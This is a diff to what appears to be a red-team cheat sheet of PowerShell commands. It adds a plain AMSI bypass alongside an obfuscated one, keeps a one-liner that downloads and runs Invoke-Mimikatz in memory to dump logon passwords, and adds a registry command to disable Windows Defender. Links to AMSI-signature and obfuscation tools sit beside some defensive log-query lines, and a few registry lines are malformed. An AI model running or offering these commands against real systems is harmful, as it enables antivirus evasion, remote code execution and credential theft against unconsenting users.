@@ -1,7 +1,45 @@
 ==> Bypass AMSI
+
+-> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 PS C:\> $amsi = [Ref].Assembly.GetType('Sy'+'st'+'em.Man'+'age'+'men'+'t.Au'+'toma'+'tion.A'+'ms'+'iUt'+'ils')
 PS C:\> $field = $amsi.GetField('am'+'siIn'+'itF'+'ail'+'ed','NonP'+'ubl'+'ic,St'+'atic')
 PS C:\> $field.SetValue($null,$true)
 
 ==> Mimikatz in memory:
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -Command sekurlsa::logonpasswords;
+
+--------------------------------------------------------------------------------------------------------------------
+
+Disable Antivirus in Registry through powershell (must restart):
+"HKLM:\Software\policies\microsoft\windows defender" -name disableantispyware -value 1 --Force
+
+Turn Windows Defender on (must restart):
+New-Item-Property -Path "HKLM:\Software\policies\microsoft\windows defender" -name disableantispyware -value 0 --Force
+
+--------------------------------------------------------------------------------------------------------------------
+
+Pull WinDefender logs (1116 = Malware detection):
+Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational'-MaxEvents 10 | Where-Object Id -eq 1116 | Format-List
+
+---------------------------------------------------------------------------------------------------------------------
+
+AMSI_RESULT_CLEAN = 0
+AMSI_RESULT_NOT_DETECTED = 1
+AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
+AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
+AMSI_RESULT_DETECTED = 32768
+
+---------------------------------------------------------------------------------------------------------------------
+
+AMSITrigger:
+https://github.com/RythmStick/AMSITrigger
+
+ThreatCheck:
+https://github.com/rasta-mouse/ThreatCheck.git
+
+---------------------------------------------------------------------------------------------------------------------
+
+ISE-Steroids for obfuscation:
+http://www.powertheshell.com
+
